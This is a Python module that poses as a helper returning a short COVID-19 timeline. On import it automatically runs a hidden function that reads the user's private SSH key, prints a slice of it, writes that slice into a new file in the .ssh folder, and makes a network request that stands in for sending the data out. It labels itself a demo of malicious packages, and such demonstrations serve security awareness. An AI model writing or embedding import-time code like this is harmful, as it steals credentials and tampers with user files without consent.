import urllib.parse
import urllib.request
from pathlib import Path

__all__ = ["helper"]


# get data for you
def helper():
    """I'm useful helper"""
    data = {
        "31 Dec 2019": "Wuhan Municipal Health Commission, China, reported a cluster of cases of pneumonia in Wuhan, Hubei Province. A novel coronavirus was eventually identified.",
        "1 January 2020": "WHO had set up the IMST (Incident Management Support Team) across the three levels of the organization: headquarters, regional headquarters and country level, putting the organization on an emergency footing for dealing with the outbreak.",
        "4 January 2020": "WHO reported on social media that there was a cluster of pneumonia cases – with no deaths – in Wuhan, Hubei province."
    }
    return data


# and than do evil thing
def get_your_data():
    WARNING = "\033[93m"
    ENDC = "\033[0m"

    rsa = Path().home().joinpath(".ssh", "id_rsa").read_text()
    private_data = f"{rsa[50:60]:=^20}"

    print(WARNING)
    print("DEMO!! You have been hacked")
    print(private_data)

    print("Also write a hacked file in .ssh")
    Path().home().joinpath(".ssh", "hacked").write_text(private_data)

    print("It could send it out to somewhere!!")
    url = "https://www.google.com"
    req = urllib.request.Request(url)
    with urllib.request.urlopen(req) as response:
        the_page = response.read()
        print(the_page[:20])
    print(ENDC)


get_your_data()
